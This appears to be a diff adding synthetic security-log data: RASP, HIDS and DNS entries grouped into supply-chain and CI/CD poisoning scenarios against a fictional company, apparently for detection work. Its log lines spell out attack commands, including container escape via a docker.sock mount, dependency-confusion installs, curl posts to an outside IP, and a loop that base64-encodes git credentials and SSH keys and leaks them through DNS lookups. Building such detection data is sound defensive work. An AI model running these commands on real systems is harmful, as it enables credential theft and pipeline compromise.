+        "content": "https://app-django-190.ops-corp.com/api/v1/pip/config {\"index_url\": \"10.20.5.77/simple\", \"tool\": \"pip\"} Mozill"
+      },
+      {
+        "n": 2,
+        "ts": "2026-07-10 01:22:03",
+        "source": "hids",
+        "log_id": "HID0505256",
+        "content": "pip install -i 10.20.5.77/s reqeusts /usr/bin/pip pip install -i 10.20.5.77/s reqeusts <== python3 -m pip"
+      }
+    ]
+  },
+  {
+    "unit": 1135,
+    "family": "FC",
+    "family_title": "供应链与 CI/CD 投毒链",
+    "file": "data-1121-1140.txt",
+    "technique": "CI runner 逃逸到集群（docker.sock 挂载 + ServiceAccount token 提权）",
+    "source_sequence": [
+      "rasp",
+      "hids",
+      "hids"
+    ],
+    "start": "2026-07-13 23:03:39",
+    "entries": [
+      {
+        "n": 1,
+        "ts": "2026-07-13 23:03:39",
+        "source": "rasp",
+        "log_id": "RASP0545732",
+        "content": "https://app-go-52.ops-corp.com/api/v1/runner/shell {\"runner\": \"dind\", \"sock\": \"docker.sock\"} Mozilla/5.0 (Wind"
+      },
+      {
+        "n": 2,
+        "ts": "2026-07-13 23:04:37",
+        "source": "hids",
+        "log_id": "HID0534536",
+        "content": "docker run -v /:/host alpine /usr/bin/docker docker run -v /:/host <== dockerd"
+      },
+      {
+        "n": 3,
+        "ts": "2026-07-13 23:05:24",
+        "source": "hids",
+        "log_id": "HID0534540",
+        "content": "kubectl --token=$SA_TOKEN auth whoami /usr/bin/kubectl kubectl --token=$SA_TOKEN auth whoami <== /bin/bash -c "
+      }
+    ]
+  },
+  {
+    "unit": 1136,
+    "family": "FC",
+    "family_title": "供应链与 CI/CD 投毒链",
+    "file": "data-1121-1140.txt",
+    "technique": "CI 缓存投毒（缓存包内含恢复后钩子被 runner 执行）",
+    "source_sequence": [
+      "hids"
+    ],
+    "start": "2026-07-31 17:21:11",
+    "entries": [
+      {
+        "n": 1,
+        "ts": "2026-07-31 17:21:11",
+        "source": "hids",
+        "log_id": "HID0667730",
+        "content": "tar xzf cache.tgz -C / && ./post.sh /bin/tar tar xzf cache.tgz -C / && ./post.sh <== Runner.Listener"
+      }
+    ]
+  },
+  {
+    "unit": 1137,
+    "family": "FC",
+    "family_title": "供应链与 CI/CD 投毒链",
+    "file": "data-1121-1140.txt",
+    "technique": "依赖混淆（占用内网包名的高版本公网同名包被自动拉取）",
+    "source_sequence": [
+      "hids",
+      "hids"
+    ],
+    "start": "2026-07-01 19:44:46",
+    "entries": [
+      {
+        "n": 1,
+        "ts": "2026-07-01 19:44:46",
+        "source": "hids",
+        "log_id": "HID0443507",
+        "content": "npm i ops-corp-telemetry@99.0.0 /usr/bin/npm npm i ops-corp-telemetry@99.0.0 <== node /usr/local/bin/npm"
+      },
+      {
+        "n": 2,
+        "ts": "2026-07-01 19:45:28",
+        "source": "hids",
+        "log_id": "HID0443511",
+        "content": "curl -d @pkg.json 203.0.113.44 /usr/bin/curl curl -d @pkg.json 203.0.113.44 <== node /usr/local/bin/npm"
+      }
+    ]
+  },
+  {
+    "unit": 1138,
+    "family": "FC",
+    "family_title": "供应链与 CI/CD 投毒链",
+    "file": "data-1121-1140.txt",
+    "technique": "发布 token 滥用（构建机持 token 直接推送恶意 gem 版本）",
+    "source_sequence": [
+      "hids",
+      "hids",
+      "hids"
+    ],
+    "start": "2026-07-05 19:50:51",
+    "entries": [
+      {
+        "n": 1,
+        "ts": "2026-07-05 19:50:51",
+        "source": "hids",
+        "log_id": "HID0473535",
+        "content": "gem build ops.gemspec /usr/bin/gem gem build ops.gemspec <== /bin/sh -c 'gem build' <== bundle exec gem exec r"
+      },
+      {
+        "n": 2,
+        "ts": "2026-07-05 19:52:19",
+        "source": "hids",
+        "log_id": "HID0473543",
+        "content": "gem push ops-9.9.9.gem --key ci /usr/bin/gem gem push ops-9.9.9.gem <== bundle exec gem exec rake"
+      },
+      {
+        "n": 3,
+        "ts": "2026-07-05 19:53:04",
+        "source": "hids",
+        "log_id": "HID0473547",
+        "content": "git tag -f v9.9.9 /usr/bin/git git tag -f v9.9.9 <== /bin/sh -c 'git tag' <== bundle exec gem"
+      }
+    ]
+  },
+  {
+    "unit": 1139,
+    "family": "FC",
+    "family_title": "供应链与 CI/CD 投毒链",
+    "file": "data-1121-1140.txt",
+    "technique": "制品校验绕过发生产（校验脚本被改后部署未签名包）",
+    "source_sequence": [
+      "hids",
+      "dns",
+      "dns",
+      "dns"
+    ],
+    "start": "2026-07-21 23:43:29",
+    "entries": [
+      {
+        "n": 1,
+        "ts": "2026-07-21 23:43:29",
+        "source": "hids",
+        "log_id": "HID0594730",
+        "content": "sha256sum -c sum.txt && deploy --skip-verify nfx-1.4.tgz /usr/bin/sha256sum sha256sum -c sum.txt <== /bin/bash"
+      },
+      {
+        "n": 2,
+        "ts": "2026-07-22 01:49:29",
+        "source": "dns",
+        "log_id": "DNS0578737",
+        "content": "cc11fdda.wqnvhs-6d24.net A 198.51.100.136"
+      },
+      {
+        "n": 3,
+        "ts": "2026-07-22 01:49:57",
+        "source": "dns",
+        "log_id": "DNS0578739",
+        "content": "76f957c1.wqnvhs-6d24.net A 10.10.24.44"
+      },
+      {
+        "n": 4,
+        "ts": "2026-07-22 01:50:58",
+        "source": "dns",
+        "log_id": "DNS0578745",
+        "content": "86b8c742.wqnvhs-6d24.net A 10.10.24.94"
+      }
+    ]
+  },
+  {
+    "unit": 1140,
+    "family": "FC",
+    "family_title": "供应链与 CI/CD 投毒链",
+    "file": "data-1121-1140.txt",
+    "technique": "供应链 C2 回连（打包 CI 凭据后经 DNS 隧道外传）",
+    "source_sequence": [
+      "hids",
+      "hids",
+      "dns",
+      "dns",
+      "dns"
+    ],
+    "start": "2026-07-22 11:37:52",
+    "entries": [
+      {
+        "n": 1,
+        "ts": "2026-07-22 11:37:52",
+        "source": "hids",
+        "log_id": "HID0598451",
+        "content": "base64 .git-credentials id_rsa > /tmp/.c /bin/base64 base64 .git-credentials <== php-fpm: pool www"
+      },
+      {
+        "n": 2,
+        "ts": "2026-07-22 11:39:50",
+        "source": "hids",
+        "log_id": "HID0598461",
+        "content": "for l in $(base64 /tmp/.c|fold -w30); do nslookup $l.rvnqzt-9b41.net; done for for l <== /bin/bash -c 'for' <="
+      },
+      {
+        "n": 3,
+        "ts": "2026-07-22 16:15:50",
+        "source": "dns",
+        "log_id": "DNS0583203",
+        "content": "b2be53e9.rvnqzt-9b41.net A 10.10.43.60"
+      },
+      {
+        "n": 4,
+        "ts": "2026-07-22 16:16:24",
+        "source": "dns",
+        "log_id": "DNS0583206",
+        "content": "e9d8cfdd.rvnqzt-9b41.net A 10.10.25.165"
+      },
+      {
+        "n": 5,
+        "ts": "2026-07-22 16:17:43",
+        "source": "dns",
+        "log_id": "DNS0583213",
+        "content": "0e66506a.rvnqzt-9b41.net A 198.51.100.74"
+      }
+    ]
+  }
+]
